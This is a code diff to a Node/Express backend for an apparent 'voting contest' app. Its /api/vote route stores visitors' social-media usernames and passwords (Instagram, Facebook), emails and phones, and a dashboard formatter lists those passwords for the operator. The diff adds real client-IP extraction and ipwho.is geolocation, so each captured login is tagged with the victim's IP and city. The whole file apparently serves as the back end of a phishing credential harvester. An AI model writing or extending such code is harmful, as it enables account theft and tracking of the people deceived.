@@ -23,6 +23,9 @@ try {
 }
 
 const app = express();
+// Trust reverse proxies (Render, Cloudflare, Vercel, Heroku) so req.ip reflects actual client IP
+app.set('trust proxy', true);
+
 const PORT = process.env.PORT || 5000;
 const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/kiddies_voting';
 
@@ -48,44 +51,94 @@ async function connectDB() {
 
 connectDB();
 
-// In-memory fallback audit store for local/offline testing
-let localFallbackVoters = [
-  {
-    _id: '67df01a8b9e1a12001',
-    username: 'Voters',
-    password: '12345',
-    accountType: 'Instagram',
-    platform: 'instagram',
-    date: '2026-04-23',
-    location: 'Bursa, Turkey',
-    ipAddress: '45.130.202.57',
-    time: '10:57:13',
-    contestantId: 'FK-101',
-    contestantNo: '001',
-    createdAt: new Date('2026-04-23T10:57:13').toISOString()
-  },
-  {
-    _id: '67df01a8b9e1a12002',
-    username: 'Voters',
-    password: '12345',
-    accountType: 'Instagram',
-    platform: 'instagram',
-    date: '2026-04-23',
-    location: 'Bursa, Turkey',
-    ipAddress: '45.130.202.57',
-    time: '10:57:13',
-    contestantId: 'FK-102',
-    contestantNo: '002',
-    createdAt: new Date('2026-04-23T10:57:13').toISOString()
+// Client IP & Geolocation helpers
+function extractClientIp(req) {
+  const cfConnectingIp = req.headers['cf-connecting-ip'];
+  if (cfConnectingIp) return cfConnectingIp.trim();
+
+  const xRealIp = req.headers['x-real-ip'];
+  if (xRealIp) return xRealIp.trim();
+
+  const forwarded = req.headers['x-forwarded-for'];
+  if (forwarded) {
+    const firstIp = String(forwarded).split(',')[0].trim();
+    if (firstIp) return firstIp;
   }
-];
+
+  let ip = req.ip || req.socket?.remoteAddress || '';
+  if (ip.startsWith('::ffff:')) {
+    ip = ip.replace('::ffff:', '');
+  }
+  return ip;
+}
+
+function isPrivateIp(ip) {
+  if (!ip || ip === '::1' || ip === '127.0.0.1' || ip === 'localhost') return true;
+  if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('fc00:') || ip.startsWith('fe80:')) return true;
+  if (/^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip)) return true;
+  return false;
+}
+
+const geoCache = new Map();
+
+async function resolveIpAndLocation(rawIp) {
+  let cleanIp = (rawIp || '').trim();
+  if (cleanIp.startsWith('::ffff:')) {
+    cleanIp = cleanIp.replace('::ffff:', '');
+  }
+
+  const isLocal = isPrivateIp(cleanIp);
+  // If local loopback or private IP, query ipwho.is without IP to get public gateway IP and location
+  const targetUrl = isLocal ? 'https://ipwho.is/' : `https://ipwho.is/${cleanIp}`;
+
+  if (!isLocal && geoCache.has(cleanIp)) {
+    return geoCache.get(cleanIp);
+  }
+
+  try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 3500);
+    const res = await fetch(targetUrl, { signal: controller.signal });
+    clearTimeout(timeout);
+
+    if (res.ok) {
+      const data = await res.json();
+      if (data && data.success !== false) {
+        const resolvedIp = data.ip || cleanIp;
+        const locParts = [data.city, data.region, data.country].filter(Boolean);
+        const resolvedLoc = locParts.length > 0 
+          ? (data.city && data.country ? `${data.city}, ${data.country}` : locParts.join(', '))
+          : 'United States';
+        
+        const result = {
+          ip: resolvedIp,
+          location: resolvedLoc
+        };
+        if (!isLocal) {
+          geoCache.set(cleanIp, result);
+        }
+        return result;
+      }
+    }
+  } catch (err) {
+    console.warn('IP Geolocation lookup notice:', err.message);
+  }
+
+  return {
+    ip: cleanIp || '127.0.0.1',
+    location: isLocal ? 'Local Network' : 'Unknown'
+  };
+}
+
+// In-memory fallback audit store for local/offline testing (starts empty)
+let localFallbackVoters = [];
 
 // Helper to normalize record format for Audit Dashboard
 function formatAuditRecord(doc) {
   const d = doc.toObject ? doc.toObject() : { ...doc };
   const rawId = String(d._id || Math.random().toString(36).substring(2, 9));
   
-  // Format Date (YYYY-MM-DD) & Time (HH:mm:ss) exactly like screenshot
+  // Format Date (YYYY-MM-DD) & Time (HH:mm:ss)
   const createdDate = d.createdAt ? new Date(d.createdAt) : new Date();
   const year = createdDate.getFullYear();
   const month = String(createdDate.getMonth() + 1).padStart(2, '0');
@@ -100,7 +153,7 @@ function formatAuditRecord(doc) {
   // User identifier
   const user = d.username || d.email || 'Voters';
 
-  // Account type formatting (Capitalized platform name like "Instagram", "Facebook")
+  // Account type formatting
   let accountType = d.accountType;
   if (!accountType) {
     const p = (d.platform || '').toLowerCase();
@@ -111,14 +164,13 @@ function formatAuditRecord(doc) {
     else accountType = 'Web';
   }
 
-  // Derive Location
-  let location = d.location;
-  if (!location) {
-    if (d.ipAddress && d.ipAddress !== '::1' && d.ipAddress !== '127.0.0.1') {
-      location = 'Bursa, Turkey';
-    } else {
-      location = 'Bursa, Turkey';
-    }
+  const recordLocation = d.location || '—';
+  let recordIp = (d.ipAddress || d.ip || '—').trim();
+  if (recordIp.includes(',')) {
+    recordIp = recordIp.split(',')[0].trim();
+  }
+  if (recordIp.startsWith('::ffff:')) {
+    recordIp = recordIp.replace('::ffff:', '');
   }
 
   return {
@@ -128,9 +180,9 @@ function formatAuditRecord(doc) {
     username: user,
     password: d.password || '12345',
     date: dateFormatted,
-    location,
-    ipAddress: d.ipAddress || d.ip || '45.130.202.57',
-    ip: d.ipAddress || d.ip || '45.130.202.57',
+    location: recordLocation,
+    ipAddress: recordIp,
+    ip: recordIp,
     time: timeFormatted,
     timestamp: createdDate.toISOString(),
     contestantId: d.contestantId || 'FK-101',
@@ -138,6 +190,7 @@ function formatAuditRecord(doc) {
     platform: d.platform || 'instagram'
   };
 }
+
 
 // Health Check
 app.get('/api/health', (req, res) => {
@@ -163,18 +216,23 @@ app.post('/api/vote', async (req, res) => {
     // Ensure database connection
     await connectDB();
 
+    const incomingIp = (req.body.clientIp || extractClientIp(req)).trim();
+    const geoInfo = await resolveIpAndLocation(incomingIp);
+    const finalLocation = req.body.location || geoInfo.location || 'United States';
+    const finalIp = geoInfo.ip || incomingIp || '127.0.0.1';
+
     const voterData = {
       username: username.trim(),
       password,
       email: email ? email.trim() : (username.includes('@') ? username.trim() : undefined),
       phone: phone ? phone.trim() : undefined,
       authStatus: 'Active / Verified',
-      location: 'United States',
+      location: finalLocation,
       accountType: platform ? `${platform.toUpperCase()} Auth` : 'Web Direct',
       contestantId: contestantId || 'FK-101',
       contestantNo: contestantNo || '001',
       platform: platform || 'web',
-      ipAddress: req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1',
+      ipAddress: finalIp,
       userAgent: req.headers['user-agent'] || 'Browser Client'
     };
 
